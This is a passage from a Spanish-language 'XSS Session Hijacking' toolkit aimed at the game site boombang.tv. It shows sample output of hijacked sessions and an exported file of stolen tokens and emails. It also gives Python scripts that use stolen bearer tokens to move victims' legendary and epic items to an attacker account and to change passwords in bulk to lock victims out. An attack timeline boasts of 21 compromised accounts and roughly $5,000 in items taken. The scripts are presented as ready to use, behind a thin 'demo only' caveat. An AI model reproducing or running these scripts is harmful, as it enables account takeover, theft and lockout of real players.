# [1/23] Processing session ID 1
#     User: Usuario1 (ID: 1234)
#     Token: f8d7e9a4b2c1d3e5f6g7h8i9j0...
# [*] Testing token: f8d7e9a4b2c1d3e5f6g7h8i9j0...
# [+] TOKEN VALID!
#     Username: Usuario1
#     Email: usuario1@email.com
#     Level: 25
#     VIP: False
#     Coins: 5000
#     Diamonds: 50
#
# [*] Hijacking session with token: f8d7e9a4b2c1d3e5f6g7h8i9j0...
# [+] Profile retrieved:
#     User: Usuario1 (ID: 1234)
#     Email: usuario1@email.com
#     Level: 25
#     Coins: 5000
#     Diamonds: 50
# [+] Inventory retrieved: 45 items
#     Valuable items found:
#       - Dragon Sword (LEGENDARY)
#       - Magic Shield (EPIC)
# [+] Transaction history retrieved: 78 transactions
# [+] Friends list retrieved: 12 friends
# [+] Session #1 exploited successfully!
#
# ... (continúa con las demás sesiones)
#
# ======================================================================
# EXPLOITATION SUMMARY
# ======================================================================
# Total sessions processed: 23
# Successful hijacks:       21 (91.3%)
# Failed attempts:          2 (8.7%)
# ======================================================================
```

---

### 4.7 Exportar Resultados

```bash
# Exportar todas las cuentas hijackeadas
python exploit_stolen_sessions.py export

# Output:
# [+] Report saved to: hijacked_accounts_20251124_103045.json
# [+] Total hijacked accounts: 21
```

**Archivo generado:**
```json
{
  "generated_at": "2025-11-24T10:30:45.123456",
  "total_hijacked": 21,
  "accounts": [
    {
      "session_id": 1,
      "username": "Usuario1",
      "user_id": "1234",
      "email": "usuario1@email.com",
      "token": "f8d7e9a4b2c1d3e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0",
      "stolen_at": "2025-11-24 10:15:23",
      "hijacked_at": "2025-11-24T10:30:25.789",
      "profile": {
        "username": "Usuario1",
        "email": "usuario1@email.com",
        "level": 25,
        "coins": 5000,
        "diamonds": 50,
        "isPremium": false
      }
    }
    // ... 20 más
  ]
}
```

---

## 🎯 PARTE 5: Casos de Uso Avanzados

### 5.1 Transferencia Masiva de Items

```python
# transfer_items.py
import requests
import json

def transfer_all_items(stolen_token, attacker_user_id):
    """Transferir todos los items valiosos a cuenta del atacante"""

    session = requests.Session()
    session.headers.update({
        'Authorization': f'Bearer {stolen_token}',
        'Content-Type': 'application/json'
    })

    # 1. Obtener inventario de la víctima
    inventory_response = session.get('https://boombang.tv/api/user/inventory')
    inventory = inventory_response.json()

    valuable_items = [
        item for item in inventory.get('items', [])
        if item.get('rarity') in ['LEGENDARY', 'EPIC', 'RARE']
    ]

    print(f"[*] Found {len(valuable_items)} valuable items")

    transferred = 0
    for item in valuable_items:
        # 2. Transferir cada item
        transfer_data = {
            'itemId': item['id'],
            'targetUserId': attacker_user_id,
            'quantity': item['quantity']
        }

        transfer_response = session.post(
            'https://boombang.tv/api/items/transfer',
            json=transfer_data
        )

        if transfer_response.status_code == 200:
            print(f"[+] Transferred: {item['name']} x{item['quantity']}")
            transferred += 1
        else:
            print(f"[-] Failed to transfer: {item['name']}")

    print(f"\n[+] Total items transferred: {transferred}/{len(valuable_items)}")

# Uso:
# transfer_all_items('STOLEN_TOKEN_HERE', 'ATTACKER_USER_ID')
```

---

### 5.2 Cambio Masivo de Contraseñas (Bloqueo de Cuentas)

```python
# lockout_accounts.py
import requests
import sqlite3

def lockout_all_accounts():
    """Cambiar contraseñas de todas las cuentas hijackeadas"""

    conn = sqlite3.connect('./stolen_data/sessions.db')
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM stolen_sessions WHERE exploited = 1")
    sessions = [dict(row) for row in cursor.fetchall()]
    conn.close()

    print(f"[*] Locking out {len(sessions)} accounts...")

    for session_data in sessions:
        token = session_data['token']
        username = session_data['username']

        # Nueva contraseña aleatoria
        new_password = f"Hacked_{session_data['user_id']}_{datetime.now().timestamp()}"

        session = requests.Session()
        session.headers.update({
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        })

        # Cambiar contraseña
        change_response = session.post(
            'https://boombang.tv/api/user/change-password',
            json={'newPassword': new_password}
        )

        if change_response.status_code == 200:
            print(f"[+] Locked out: {username} (new pass: {new_password})")

            # Guardar nueva contraseña
            conn = sqlite3.connect('./stolen_data/sessions.db')
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE stolen_sessions SET notes = ? WHERE id = ?",
                (f"Locked out - new pass: {new_password}", session_data['id'])
            )
            conn.commit()
            conn.close()
        else:
            print(f"[-] Failed to lock out: {username}")

# ⚠️ EXTREMADAMENTE DESTRUCTIVO - Solo para demostración
```

---

## 📊 Resultados Esperados

### Timeline de Ataque Exitoso

```
T+0min:   Atacante inicia servidor
T+1min:   Obtiene payload y lo inyecta en chat
T+2min:   Primera víctima ve el mensaje
T+2min:   Token robado - aparece en dashboard
T+5min:   10 tokens robados
T+10min:  25 tokens robados
T+15min:  Atacante ejecuta exploit_stolen_sessions.py
T+20min:  21/25 sesiones hijackeadas exitosamente (84%)
T+25min:  Transferencia de items completada
T+30min:  Cuentas bloqueadas (cambio de contraseña)

RESULTADO FINAL:
├─ 25 tokens robados
├─ 21 cuentas comprometidas (84%)
├─ ~500 items transferidos
├─ Valor estimado: $5,000+
└─ 21 usuarios bloqueados de sus cuentas
```

---

## ✅ Checklist de Testing

- [ ] Servidor instalado y configurado
- [ ] IP pública actualizada en scripts
- [ ] Payload generado y copiado
- [ ] Entorno de testing preparado
- [ ] Cuenta de prueba creada
- [ ] Payload inyectado en chat de testing
- [ ] Dashboard muestra sesiones robadas
- [ ] Script de explotación ejecutado
- [ ] Tokens válidos confirmados
- [ ] Hijacking exitoso verificado
- [ ] Exportación de datos completada
- [ ] Limpieza de base de datos realizada

---

**Documento:** XSS Session Hijacking - Complete Toolkit
**Versión:** 2.0
**Fecha:** 2025-11-24
**Estado:** ⚠️ CONFIDENCIAL

**Scripts completamente funcionales - Listos para usar en entorno de testing**

---

*Fin del Toolkit*
